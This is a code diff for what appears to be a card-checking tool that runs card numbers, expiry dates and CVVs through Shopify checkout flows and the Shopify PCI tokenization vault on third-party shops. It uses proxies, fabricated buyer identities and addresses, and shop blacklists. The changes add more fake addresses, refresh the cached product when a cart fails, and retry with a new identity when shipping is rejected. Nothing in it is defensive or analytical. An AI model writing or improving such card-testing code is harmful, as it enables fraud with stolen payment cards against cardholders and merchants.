@@ -68,7 +68,6 @@ def _dec_busy():
 
 _last_failure = {}
 
-# Cache for products and blacklist for dead sites
 _PRODUCT_CACHE = {}   # { shop_url: (variant_id, price) }
 _BLACKLIST = {}       # { shop_url: expire_timestamp }
 _CACHE_LOCK = threading.Lock()
@@ -97,6 +96,8 @@ ADDRESSES = [
     {"street":"101 N Last Chance Gulch",  "city":"Helena",    "state":"MT","zip":"59601","phone":"+14065550100"},
     {"street":"1 Granite St",             "city":"Concord",   "state":"NH","zip":"03301","phone":"+16035550100"},
     {"street":"100 W 10th St",            "city":"Wilmington","state":"DE","zip":"19801","phone":"+13025550100"},
+    {"street":"500 5th Ave",              "city":"New York",  "state":"NY","zip":"10110","phone":"+12125550100"},
+    {"street":"200 W Madison St",         "city":"Chicago",   "state":"IL","zip":"60606","phone":"+13125550100"},
 ]
 
 def _identity():
@@ -267,7 +268,6 @@ def _payment_method_id_from_html(h):
         if m: return m.group(1)
     return ""
 
-# ═══ FIX: Extract Signature and Vault URLs (Crucial for PCI) ═══
 def _ident_sig(h):
     decoded = h.replace('&quot;', '"')
     for pat in [
@@ -341,7 +341,6 @@ def _cheapest_product(session, shop_url, ua, timeout=8):
         except Exception as e:
             diag.append((ep.split(shop_url)[-1], f"exc:{str(e)[:40]}"))
 
-    # HTML Fallback (Bypasses 403)
     try:
         r = session.get(f"{shop_url}/collections/all", headers={"user-agent": ua}, timeout=timeout)
         diag.append(("/collections/all (HTML)", r.status_code))
@@ -369,7 +368,7 @@ def _cheapest_product(session, shop_url, ua, timeout=8):
     return None, None, diag
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🛒 PAYLOAD BUILDER (Dynamic Schema)
+# 🛒 PAYLOAD BUILDER
 # ─────────────────────────────────────────────────────────────────────────────
 def _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, proposal_id, use_lines=False):
     if addr:
@@ -464,7 +463,7 @@ def _proposal_payload(session_token, stable_id, vid, amount, currency, email, ad
     }
 
 # ─────────────────────────────────────────────────────────────────────────────
-# 🔑 PCI (FIXED: With ident_sig and correct headers)
+# 🔑 PCI
 # ─────────────────────────────────────────────────────────────────────────────
 def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", vault_url="", vault_domain="", proxy_url=""):
     _DEFAULT_VAULT = "https://checkout.pci.shopifyinc.com/sessions"
@@ -518,7 +517,6 @@ def _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig="", 
     except Exception as e:
         _last_failure = {"reason": "PCI_EXC", "err": str(e)[:100]}
 
-    # Retry with shopifycs if shopifyinc failed
     if "shopifyinc" in endpoint:
         return _tokenize(session, ccn, mm, yyyy, cvv, name, shop_domain, ua, ident_sig, "https://checkout.pci.shopifycs.com/sessions", vault_domain, proxy_url)
 
@@ -602,7 +600,11 @@ def _run_check(card_str, proxy_str):
                             allow_redirects=True, timeout=min(10, max(3, remain())))
         except Exception:
             return _resp("CART_FAILED", price=f"{price} USD")
+        
+        # ═══ FIX: Clear cache if cart fails so next attempt gets a new product ═══
         if r.status_code != 200:
+            with _CACHE_LOCK:
+                _PRODUCT_CACHE.pop(shop_url, None)
             return _resp("CART_FAILED", price=f"{price} USD")
 
         checkout_url  = r.url
@@ -678,66 +680,54 @@ def _run_check(card_str, proxy_str):
         if r2.status_code != 200:
             return _fail("P2_HTTP", shop=shop_url, status=r2.status_code, body=r2.text[:800])
 
-        try:
-            p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
-            p["variables"]["queueToken"] = queue_token
-            r3 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
-        except Exception as e:
-            return _fail("P3_EXC", shop=shop_url, err=str(e)[:100])
-        if r3.status_code != 200:
-            return _fail("P3_HTTP", shop=shop_url, status=r3.status_code, body=r3.text[:800])
-
-        bodies = [r3.text]
-        pm_id  = _payment_method_id(r3.text)
-        del_h  = _delivery_handle(r3.text)
-        signed = _signed_handles(r3.text)
-        tax    = _tax_amount(r3.text)
-        amount_f = _checkout_total(r3.text) or amount
-        queue_token = _queue_token(r3.text) or queue_token
-        shipping_required = _is_shipping_required(r3.text)
+        # ═══ FIX: Address retry loop for SHIPPING errors ═══
+        pm_id = ""
+        del_h = ""
+        signed = []
+        tax = "0.0"
+        amount_f = amount
+        shipping_required = True
+        r3_text = ""
 
         for _ in range(3):
-            if pm_id and (signed or not shipping_required) and (del_h or not shipping_required):
-                break
-            if remain() < 8:
-                break
-            time.sleep(0.05)
             try:
                 p = _proposal_payload(session_token, stable_id, vid, amount, currency, email, addr, prop_id, use_lines)
                 p["variables"]["queueToken"] = queue_token
-                rN = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
-                if rN.status_code != 200: continue
-                bodies.append(rN.text)
-                nq = _queue_token(rN.text)
-                if nq: queue_token = nq
-                np = _payment_method_id(rN.text)
-                if np: pm_id = np
-                ns = _signed_handles(rN.text)
-                if ns: signed = ns
-                nd = _delivery_handle(rN.text)
-                if nd: del_h = nd
-                nt = _tax_amount(rN.text)
-                if nt and nt != "0.0": tax = nt
-                na = _checkout_total(rN.text)
-                if na: amount_f = na
+                r3 = session.post(prop_url, headers=hdr, json=p, timeout=min(8, max(3, remain())))
+                
+                if r3.status_code == 200:
+                    r3_text = r3.text
+                    if "SHIPPING_ADDRESS_UNDELIVERABLE" in r3_text or "no_delivery_options" in r3_text:
+                        raise Exception("Shipping undeliverable")
+                    
+                    pm_id  = _payment_method_id(r3_text)
+                    del_h  = _delivery_handle(r3_text)
+                    signed = _signed_handles(r3_text)
+                    tax    = _tax_amount(r3_text)
+                    amount_f = _checkout_total(r3_text) or amount
+                    queue_token = _queue_token(r3_text) or queue_token
+                    shipping_required = _is_shipping_required(r3_text)
+                    
+                    if pm_id and (signed or not shipping_required) and (del_h or not shipping_required):
+                        break
             except Exception:
-                continue
+                pass
+                
+            # Generate a new address and retry
+            time.sleep(0.1)
+            fn, ln, email, addr_raw = _identity()
+            addr = {"fn":fn,"ln":ln,"street":addr_raw["street"],"city":addr_raw["city"],
+                    "state":addr_raw["state"],"zip":addr_raw["zip"],"phone":addr_raw["phone"]}
 
         if not pm_id:
             pm_id = _payment_method_id_from_html(checkout_html)
 
         if not pm_id:
-            return _fail("NO_PAYMENT_ID", shop=shop_url, proposals=len(bodies),
-                         body=bodies[-1][:800] if bodies else "")
+            return _fail("NO_PAYMENT_ID", shop=shop_url, body=r3_text[:800])
 
-        if shipping_required and not signed:
-            return _fail("NO_SIGNED_HANDLES", shop=shop_url, proposals=len(bodies))
-        if shipping_required and not del_h:
-            return _fail("NO_DELIVERY_HANDLE", shop=shop_url, proposals=len(bodies))
         if remain() < 6:
             return _fail("BUDGET_AFTER_PROPOSALS", shop=shop_url)
 
-        # ═══ FIX: Pass extracted ident_sig, vault_url, vault_domain ═══
         ident_sig = _ident_sig(checkout_html)
         v_url     = _vault_url(checkout_html)
         v_dom     = _vault_domain(checkout_html)
